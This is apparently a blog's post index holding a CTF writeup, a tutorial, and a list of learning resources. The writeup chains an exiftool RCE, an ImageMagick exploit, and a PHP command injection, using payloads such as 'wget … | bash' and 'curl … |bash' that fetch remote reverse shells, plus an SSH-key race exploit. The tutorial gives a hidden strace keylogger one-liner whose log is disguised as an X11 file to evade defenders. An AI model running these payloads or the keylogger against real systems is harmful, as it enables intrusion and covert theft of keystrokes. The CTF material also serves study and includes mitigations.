[ { "title": "MystikoCTF Writeup", "url": "/posts/mystiko-writeup/", "categories": "Linux, CTF, Privilege Escalation, Writeups", "tags": "linux, ctf, writeups, oscp", "date": "2021-12-07 08:00:00 +0800", "snippet": "Mystiko CTF Writeup by Freddie This is the writeup for the main challenge I rooted in Mystiko CTF. Scoring for this CTF was slightly odd: Each flag was worth 100 points, and up to 400 points would be awarded for the writeup. As there were only 6 flags available (5 of which I scored), the writeups were a pretty crucial section, so I’ve spent a lot of time waffling and explaining every little step. Additionally, due to time restrictions in the competition this is barely checked for grammar/technical issues. That being said, I’m still posting this one to hopefully inspire some people to realise if a skid like me can do this, then they can too.Pixel - Initial MachineInitial FootholdAs per usual, we start off the challenge with a basic nmap scan, to enumerate what open ports are on the machine.There are only two services publicly available: SSH (22) HTTP (8080)We can visit the HTTP server on port 8080, and start manually playing with the application in order to see what it actually does.It seems we can upload images, then play with some image filters and settings.My immediate conclusion was that this must be a file upload vulnerability, and that I could inject something into the filename and that’d be that.With the wonderful ability of hindsight, I can tell you that no, not only is this further from the truth, there are also no hidden directories of files on the webserver.6 hours and 2 million words fuzzed later (I would not recommend doing this on an actual penetration test), my previous self came to the same conclusion. It was only after a significant break, and a little time spent banging my head against a hard wall, I noticed something strange.When a file is uploaded, there is a hidden element in the source code. 10.61image/jpeg25 kB349x480In fact, this looked rather familiar:Could it perhaps be data from the tool exiftool, and that number at the top was the exiftool version?!With just one small Google search, we can discover that yes, there is an exiftool version named 10.61, and better still there’s a public exploit for ithttps://github.com/se162xg/CVE-2021-22204As the webserver returns very little feedback, we can locally install the exiftool version, then run the exploits against it.https://github.com/exiftool/exiftool/releases/tag/10.61To do so, we must first create a docker instance, to isolate the exiftool version, and just make things easier to work with generally:docker run -v ~/Documents/THM/Mystiko/exif_exploit:/mnt/exploit -it debian bashWe can also create a shared volume, so that transferring malicious payloads between the docker image, and main host is easy.The following script initializes the docker container, and installs the exploit and necessary tools.apt updateapt install git -yapt install bc -ycd /mnt/exploitgit clone https://github.com/se162xg/CVE-2021-22204.gitcd CVE-2021-22204sed -i &#39;s/sudo//g&#39; craft_a_djvu_exploit.shThe following script then installs the exploitable exiftool version.cd /mntapt install wget -ywget https://github.com/exiftool/exiftool/archive/refs/tags/10.61.tar.gztar xzvf 10.61.tar.gzcd exiftool-10.61perl Makefile.PL./exiftoolWe can give the exploit a test run by generating the basic image payload with the command id, then running exiftool against the generated image.It works!We have the local exploit running, now all that is needed is to run it remotely, should be easy right…bash craft_a_djvu_exploit.sh &quot;/usr/bin/wget http://10.2.76.47&quot;However, when uploading the generated file from the above command, our HTTP server receives nothing.We don’t know if the code is being executed properly, or if the requests are just being caught by a firewall, so let’s see if we can send ICMP (ping) packets through, as they’re less often restricted by firewalls (in boot2root machines, that is).bash craft_a_djvu_exploit.sh &quot;ping -c 2 10.2.76.47&quot;Our tcpdump picks up ICMP packets being sent from the server, so our code is being executed remotely!After a lot of enumeration, and having no luck getting other payloads to work, I resort to a boolean enumeration method.In bash &amp;amp;&amp;amp; operator will only execute the second command, if the first command completes.which curl &amp;amp;&amp;amp; ping -c 2 10.2.76.47So if curl is installed, the machine will ping us. Using this method, we can slowly exfiltrate information about the system.Due to some weird voodoo magic, echoing strings, writing to files and using special characters like &amp;gt; and &amp;lt; breaks the command. This means we can’t echo base64 strings into files, which makes it significantly harder to transfer files.Fortunately, we still have access to the upload file functionality of the web application. If we can find the uploads directory, we can upload scripts to aid our remote code execution.We could use our incredibly slow and inefficient method of blindly searching for the directory, or we could use some slightly cursed CTF tactics. You can take a guess which option I went with.On the challenge author’s github, there is a (now deleted) repository containing the password protected source code of the application.Despite our best efforts cracking the password, we are unable to view the source.This doesn’t mean it is completely useless, however.When we try to unzip the file we can see some very useful information:This not only shows me it is a python web application running (most likely using flask), but also that the uploads are stored in /static/uploads.As a Flask web application simply routes the directory locations, when you achieve remote code execution you simply end up in the root of the application - the same directory that contains the python server file (in this case: pixel.py).To confirm that we are actually in the root of the application, we can run the following remotely:ls pixel.py &amp;amp;&amp;amp; ping -c 2 10.2.76.47Fortunately, we receive two ping packets confirming this.However, due to some shenanigans in the cursed code execution, we cannot simply cat static/uploads/[file], but instead have to change directories, then read the file.Additionally, when trying to cd into static/uploads, it appears to not exist, but we can cd into s*/uploads.Sometimes, it’s simply best to not ask questions as to why, and hope you don’t get hurt anymore.I’ll let the timestamps talk for themselves on this one, really.Swiftly moving on, we now have access to our uploaded files. This means we can uploads bash scripts to be executed, then run them remotely.Using our elegant, efficient, and definitely not broken bash script aios.sh, we can quickly grab a reverse shell:We can upload the shell.jpg file to the server, to store it in the uploads directory.Then to call our reverse shell payload, we simply generate a new malicious image using:bash craft_a_djvu_exploit.sh &quot;cd s*/uploads &amp;amp;&amp;amp; bash shell.jpg&quot;and upload the generated delicate.jpg payload to the web application…Voila - we have a shell!Let’s stabilise this shell using the following:$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;&amp;lt;Ctrl + Z&amp;gt;&amp;gt; stty raw -echo&amp;gt; fg&amp;lt;ENTER&amp;gt;&amp;lt;ENTER&amp;gt;$ export TERM=xtermPrivilege EscalationOne of the lowest hanging fruit is checking if the current user has any special abilities set in the sudoers file. We can do this using sudo -lLuckily, the user not only has the ability to run /usr/bin/pixel as root, but also without a password!When researching the convert program, we are taken to the ImageMagick suite of tools.After a little more research, it appears the ImageMagick suite is vulnerable to an exploit aptly named ImageTragick.Using the proof of concept found here: https://rhinosecuritylabs.com/research/imagemagick-exploit-remediation/, we can create our exploit.push graphic-contextviewbox 0 0 640 480fill &#39;url(https://example.com/image.jpg&quot;| [command]&quot;)&#39;pop graphic-contextOnce again, using the oh-so-useful AllinOneShell (aios.sh) script, we can create another reverse shell payload.push graphic-contextviewbox 0 0 640 480fill &#39;url(https://example.com/image.jpg&quot;| wget -O - http://10.2.76.47:8000/shell.sh | bash&quot;)&#39;pop graphic-contextWe get a root shell!It’s now important to set up persistence so we don’t have to repeat the exploitation everytime we need a shell. PersistenceNote: please don’t use these persistence methods in a real life engagement.When initially scanning the machine, we can see that the SSH service is running.We can gain root persistence easily using this service.By default, root SSH login is disabled in the sshd configuration file (/etc/ssh/sshd_config), so we must first enable it.To put these changes into effect, we must restart the ssh service:Nice, we can now login as root, so don’t have to worry about the god-awful webapp ever again.Vulnerability MitigationsIt’s important to know how to be able to mitigate the vulnerabilities you are exploiting.Fortunately for the development team at Mystiko, it’s really not too hard to fix.FootholdThe current version of exiftool at writing (12.36) is not vulnerable to CVE-2021-22204. This means by simply updating exiftool: sudo apt install libimage-exiftool-perl, the vulnerability would be patched. Another positive is that the file upload functionality has undergone extensive testing, to which it has stood up to completely. Beers should definitely be bought for the developers because of that one.PrivescSimilarly, the vulnerability exploited in the privilege escalation phase can also be patched by simply updating the software./usr/bin/convert is part of the ImageMagick suite of tools, so to fix:sudo apt install imagemagickIt is also worth considering why the user pixel needs access to run the /usr/bin/pixel program as root, and why they do not even need their own password to do so. PivotingHaving access to SSH as root simplifies the pivoting process greatly.We can start by downloading a static nmap binary from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap.We can then upload this binary to the machine using SCP, this will help us greatly.In the ip information, we can our internal IP is 172.19.0.4.We could scan the subnet, looking for other active hosts with the command:./nmap 172.19.0.1/16 -T4 -vHowever, the /16 subnet is rather large for our purposes, with 65534 hosts.To save time, we can take an educated guess, and assume that if our IP address is 172.19.0.4, that there will be other machines at 172.19.0.3 and 172.19.0.2.Using our machine as our pivot point, we can use nmap to scan these two discovered hosts.Dev01 - Internal machineInitial FootholdFor the first machine we scan, we can see the host name is dev01.ctf_default. This suggests that we should target this machine first, as it is the next challenge. The web server (port 80) running on dev01 looks very interesting, so we need to employ a tactic called port forwarding to do so.Fortunately for us, SSH is running, so we can use this to tunnel the webserver to our local IP address.ssh -L 127.0.0.1:9001:172.19.0.3:80 root@10.10.167.211This means if we visit port 9000 on our localhost, we will be able to reach the internal webserver.Like most web applications, we can start by scanning for directories using tools such as gobuster.$ gobuster dir -u http://127.0.0.1:9001 -w /opt/raft-small-words.txt[...]/developer (Status: 301) [Size: 317] [--&amp;gt; http://127.0.0.1:9001/developer/]A couple of key bits of information stick out to me:-&amp;gt; repo : A git repository?-&amp;gt; epicdev420 : A unique username we haven’t seen beforeUsing this information, we can try perform some basic osint, and discover https://github.com/epicdev420.Our lucky guess is confirmed by the repository name: Mystikocon2021ishere.We can pull this repository, then extract the rar file, to acquire the source code for /developer:There is one file that stands out to me in particular: filechecker.php.Within that one file, one line stands out even more:The filename is not being parsed correctly, so this application may be vulnerable to command injection!When we visit the page, it seems we have the option to upload a file. Let’s upload a file normally, then proxy the request through burpsuite.We can send the request to the Repeater tab using Ctrl + R.To break out of the echo command, we must inject a payload such as follows:nice&#39;; command #&#39;This would make the command passed to shell_exec() as follows:echo &#39;nice&#39;; command # &amp;gt;&amp;gt; test.txtWe can see this command injection works beautifully, if we inject the command sleep 10 the server takes over 11 seconds to respond.However, there’s one small caveat when trying to gain a reverse shell - the special character / would crash the application.This was quite a pain, but like always, we Tried Harder™.We could make a curl request to a listener set up on the first machine we compromised (Pixel) using the filename: nice&#39;; curl 172.19.0.4:8000 #By default, curl tries to return the index.html page. If we move our shell.sh file to index.html, when curl retrieves the root of the webserver (index.html), it will grab our shell.sh file.Then if we set up our reverse shell listener (on the compromised Pixel machine, to save us having to remote port forward), curl the webserver once more, then pipe it to bash instead:nice&#39;; curl 172.19.0.4:8000|bash #It works!!We’ve got a foothold on the second machine.Lateral MovementWhen briefly enumerating the machine manually, we can see that there is one non-admin user: pixel.This is odd, as there was also a user named pixel on the initial machine. After a little more manual enumeration, I wondered, “could they be the same user, with the same password?”.This led me down the unfortunate rabbit hole of attempting to crack the bcrypt password of the pixel user on the first machine (from /etc/shadow). Unfortunately for me and my CPU, this was to no avail.However, while searching on initial machine a little more, I did discover that the /root/.bash_history file was not linked to /dev/null like usual. This means any commands root previously ran were saved to this file.At the very top of this file is one very interesting entry.ssh pixel@dev01trunm90874RR It’s almost like the user was trying to login to the pixel account on dev01, and “accidentally” pasted the password in the terminal instead.Using this password trunm90874RR, we can login to the pixel account on dev01 from www-data.We can now read /home/pixel/local.txt, for the third flag.Privilege EscalationGenerally speaking on boot2root machines, if you have a user’s password and are trying to privesc, the first thing you should check is sudoers.This allows us to execute the script as root, without even needing a password./opt/back.sh seems a custom created script, and the pixel user only has the read permission set.When reading this file however, it seems oddly familiar somehow…Due to my lack of social life, I recognised this file from the HTB machine Tenet, which I completed a few months ago. It essentially exploits a race condition in bash, so that we can overwrite a temporary file, while the root /opt/back.sh is using it.https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#shell-as-rootI’ll let the notorious 0xdf explain this one in greater depth, as it seems only fair considering I used his script.It’s worth noting there are one or two slight changes in the new script:mystiko=$(/usr/bin/mktemp -u /tmp/mystiko-XXXXXX)/usr/bin/touch $mystiko;/usr/bin/chmod 777 $mystiko/usr/bin/echo &quot;backup root public key....&quot;/usr/bin/echo &quot;[normal key]&quot; &amp;gt; $mystiko/usr/bin/cat $mystiko &amp;gt; /root/.ssh/authorized_keys/usr/bin/sleep 1/usr/bin/echo &quot;backup done.&quot;/usr/bin/rm $mystikoSo we will adapt the exploit script to overwrite all temporary files by the name of /tmp/mystiko-*.while true; do for file in /tmp/mystiko-*; do echo &quot;[public key from 1st machine: /root/.ssh/id_rsa.pub]&quot; &amp;gt; $file; done; doneRunning the above bash script from a separate terminal, when we execute sudo /opt/back.sh, our public key gets inserted instead of the default key.This allows the root user on the first machine to SSH into dev01 without need of a password.From here, all we need to do is read the flag in /root/proof.txt to finish the machine.Vulnerability MitigationsFootholdThe best advice to fix the code injection vulnerability is to remove the shell_exec function with the user input completely.Instead, try something similar to:$myfile = fopen(&quot;test.txt&quot;, &quot;a+&quot;);fwrite($myfile, $file_name);fclose($myfile);This should have exactly the same effect as the previous shell_exec function.It is also worth noting the the filename, filetype and file size are reflected back to us improperly. This means we can inject arbitrary HTML code in either of the variables, and achieve Cross-site scripting (XSS).To prevent this, the server should use the htmlspecialchars() function any any user supplied input.Lateral MovementTo prevent attacks gleaming sensitive information from the history files, you can link them to /dev/null, so no commands are stored.ln -sf /dev/null /root/.bash_historyAdditionally, it is recommended all users regularly update their passwords. It was noted in /etc/login.defs, that the password expiration policy date was set to 99999 days, so the passwords would virtually never have to be reset.PrivescOnce again, it is questioned whether the user should have the sudo permissions on the backup file. To prevent a race condition, the line chmod 777 $mystiko should be removed.This would only allow the bash script to write to the temporary file, and would prevent exploitation in the manner previously described.FlagsPixelDev01 mystikoctf{8377e3e0acca54f1da34e40f028fabe5} mystikoctf{3e3ed005320d4c091009e1d235fc9656} mystikoctf{8c1b2bfba98e077b3ae19a30f52cb1df} mystikoctf{8e805100ea1837d41032a796fc179020}ConclusionThanks for making it to the end of this writeup.I was fortunate enough to win the CTF, and consequently win the OSCP voucher.So if you read through this writeup, and understood all the content, you too could win an OSCP voucher!I’m currently working on a post to help beginners get started learning hacking for free (it can’t get more clickbaity than this right), and hopefully I should cover some tactics for winning these CTFs that aren’t just “Get Good”As you can see from the below screenshot, there were only 5 competitors so if this doesn’t prove this was 99% luck I don’t know what will." }, { "title": "Strace - Bash Keylogger", "url": "/posts/strace-keylogger/", "categories": "Linux, Tools, Offensive", "tags": "linux, tools, offensive", "date": "2021-11-17 08:00:00 +0800", "snippet": " by Freddie IntroductionSystem calls are used by processes to interact with the kernel. For example if a process wants to read or write to a file, they must make a system call to do so.To see this in practice, we’ll use strace.strace simply traces system calls, and is primarily used for debugging purposes.For this demonstration we’ll use the basic command echo:echo &quot;Freddie&quot; &amp;gt; /tmp/demo.fileThis command simply writes the string “Freddie” to the temporary file /tmp/demo.fileWe can use strace to trace what system calls are being called during the execution of this command, and to view what is actually going on under the hood.To do this, we could simply run strace [command], although to glean even more information about the process, we can actually attach the strace tool to the parent process.This allows us to trace the bash redirect (&amp;gt;), and is generally more insightful. strace -p [pid] attaches to a PID (Process ID) $$ in bash is the current process’s PID (or the bash shell)You can see we have now attached to the process running above.We can now paste our echo command we created above.If you’re following along, prepare to be greeted with an overwhelming amount of information.If we ignore the irrelevant (for the purposes of this demonstration) system calls made by bash and search for our input we can see two key system calls are made.openat() - This opens /tmp/demo.file with the 0666 permissions.write() - This core system call writes the string Freddie\\n to the opened file.It is worth noting the newline is appended by default by the echo command - we can remove that with echo -n [string] if necessary.If you have been following the commands, you may have noticed something interesting when tracing the bash process.When we type commands into the bash shell above, each character can be seen in both the read and write system calls. From this simple observation we can process the strace output to create a very rudimentary bash keylogger. Basic KeyloggerAs seen by the previous strace example, a large amount of unimportant system calls are also generated. To filter only the system calls we want, we can use the -e [syscall] flag with strace.We will select the read system call to detect all keys entered.This looks much better.Now, let’s try to extract input in a more readable format.This is where the fun(?) begins.If we try to pipe our strace output to any text processing commands, nothing.After a considerable amount of head banging and stack overflow researching, this is due to the fact strace writes all it’s output to stderr.With a little more help from stack overflow (I fear any man who can remember regex), each character inside the quotes can be extracted.This is when another slight issue arises. Due to some linux black magic, if you pipe the output of strace to grep, it is “buffered”, and cannot be easily piped into further commands. To get around this technical issue, we can output strace to a file in the background, then read the file and perform operations on that output.Basic Evasionstrace -e read -p [pid] -o /dev/shm/.X11-unixThe above command creates a hidden file in /dev/shm. The /dev/shm directory lives only in live memory, and is volatile. This makes it great for writing files we don’t want to be found, as the folder is wiped on restart.X11 is a linux graphics display, and .X11-unix is it’s config file.From experience you should not delete that (the real) file - bad things happens.This taps into the primal instinct of “bugger I won’t delete that again” to prevent defenders from not deleting our keylogger file &amp;gt;:)strace -e read -p [PID] -o /dev/shm/.X11-unix &amp;amp;cat /dev/shm/.X11-unixWe can background the strace command, then read the hidden file in order to parse it correctly.ParsingNow, all that is needed to be done is to parse the strace output in a readable manner.strace -e read -p 1239419 -o /dev/shm/.X11-unix &amp;amp;cat /dev/shm/.X11-unix | grep -oa -E &#39;&quot;(.*?)&quot;&#39; | sed &#39;s/^.\\(.*\\).$/\\1/&#39; | tr -d &quot;\\n&quot; | sed -e &quot;s/\\\\\\r/\\n/g&quot; If we wrap the cat command using watch to continually update it, we can see captured keystrokes in live time.watch -n 0.1 &#39;cat [command]&#39;strace -e read -p 1239419 -o /dev/shm/.X11-unix &amp;amp;watch -n 0.1 &quot;cat /dev/shm/.X11-unix | grep -oa -E &#39;\\&quot;(.*?)\\&quot;&#39; | sed &#39;s/^.\\(.*\\).$/\\1/&#39; | tr -d &#39;\\n&#39; | sed -e &#39;s/\\\\\\r/\\n/g&#39;&quot;The result:Voila!The final step to construct our janky bash keylogger, is to concatenate it into a glorious one-liner:strace -e read -p [PID] -o /dev/shm/.X11-unix &amp;amp; watch -n 0.1 &quot;cat /dev/shm/.X11-unix | grep -oa -E &#39;\\&quot;(.*?)\\&quot;&#39; | sed &#39;s/^.\\(.*\\).$/\\1/&#39; | tr -d &#39;\\n&#39; | sed -e &#39;s/\\\\\\r/\\n/g&#39;&quot;We now have a functioning keylogger, that operates off a commonly installed debugging tool strace!ConclusionIf there’s any takeaway messages from this absolute abomination of a script and article, it’s that there is almost nothing that Stack Overflow and a little glue can’t fix™" }, { "title": "Cyber Resources", "url": "/posts/resources/", "categories": "Resources, Notes", "tags": "resources", "date": "2000-01-01 08:00:00 +0800", "snippet": "Cyber Resources by Freddie This is a collection of all the best resources I’ve learnt from and used in the past year of my cyber security learning.This is in no means a complete list, and will be updated consistently when I come across new content, or simply remember platforms I used to use.I’ll try and sort this collection of resources into a few key sections: Linux Windows Cryptography Web Binary General Hacking MiscellaneousLinuxLinux Journey - So much incredible content on Linux, gets into the nitty gritty about processes etc.TryHackMe Fundamentals - Good for getting to grips with the command lineBy far the best way to learn Linux is to install it as your daily operating system. Force yourself to use the command line, and stack overflow the shit out of it™WindowsWild West Hacking Fest - John Strand’s introduction to Windows command line.Cyber Aces - SANS Cyber Aces introduction to WindowsWatch this spacePowershellPoSH Hunter - CTF-like introduction to Powershell.UnderTheWire - OverTheWire, but for Powershell.CryptographyCryptoHack - The best platform I’ve come across for cryptography so far.Crypto101 - A great book, if you pair this with the platform above, it will give you a great overall understanding.Cipher Challenge - This one comes from the Cipher Challenge, run by the University of Southampton, it has multiple slides introducing some basic concepts, and a 60-page long handbook.Crypto Pals - I can’t explain it better than they can, definitely worth checking the site out.“An Introduction to Mathematical Cryptography 2014” - Note: this is not free, but quite the opposite. However, I was lucky enough to get an old copy off a friend, and there’s no way I can leave this one out. The content is great, so if you want to pursue cryptography further, this book is a good place to start.BinaryNightmare - literally - A course on Binary Exploitation based around CTF challenges.Ir0nstone Notes - Notes from a student, definitely worth checking out!ROPEmporium - A collection of challenges on return-oriented programming.PWN College - A good course, although it requires some understanding to start.WebPortswigger Labs - How could I make a resource list and leave portswigger out, the web academy is simply the best I’ve seen for people wanting to learn more on Web Exploitation.PwnFunction - PwnFunction has a great collection of very clear videos explaining some web exploitation techniques, if you find videos easier to digest.Rana Khalil - Rana Khalil is amazing at explaining in depth SQL injection, and she’s regularly producing more content, so watch this space!General HackingTCM Security - A great course which covers many topics, and is incredibly cheap for the content you’re getting. Note that Heath regularly does discounts on his twitter, so it’s definitely worth watching out for that.INE eJPT Course - INE has made their course for the eJPT certification (paid certification) completely free. It has some great content, and is very beginner focused. I believe labs are included for free, but it’s worth noting the certification isn’t.HackTheBox - Some very challenging boot2root machines and challenges, and they’re also branching out with their academy, which has regular updates to content: https://academy.hackthebox.eu. The academy has some great content, and they are rapidly expanding their free and paid for material.TryHackMe - A great place to start with Cyber Security, they have loads of walkthrough and challenges around multiple areas in cyber security. Completely free for a large proportion of the content, although there is a subscriber feature.RangeForce - Lots of free content, covers much more than just pentesting content.OverTheWire - A large selection of challenges focusing on different areas, such as Linux, Web etc.SANS - SANS is great. They have such a wide variety of free content, from cheatsheets to free conferences.Cyber Aces - Also developed by SANS, it’s an online course of the basics, for free, of course ;)Nickapic Notes - Another massive collection of notes, all created with love, by Nickapic.MiscellaneousPeople:John Hammond - John Hammond makes great informative and entertaining content on YouTube.IppSec - IppSec has countless retired HackTheBox machines, and more on his channel. He’s great to watch, even if you don’t follow along, as you can just feel the intelligence leaking in.VBScrub - VbScrub has some brilliant videos on Active Directory, and focuses on Windows content, primarily through the HackTheBox platform.LiveOverflow - Live Overflow, has over 300 videos which range from technical to vlog-like.Professor Messer - Professor Messer, for all your networking needs.Tib3rius - Tib3rius is great for OSCP content, specifically Windows PrivEsc.Heath Adams - The Cyber Mentor, mentioned before for PEH course.Resources:A collection of collections of much better resources than I have here. TL/DR: Ignore everything above, visit these.5 PillarsNox’s CheatsheetPayloadAllTheThingsHackTricks" } ]
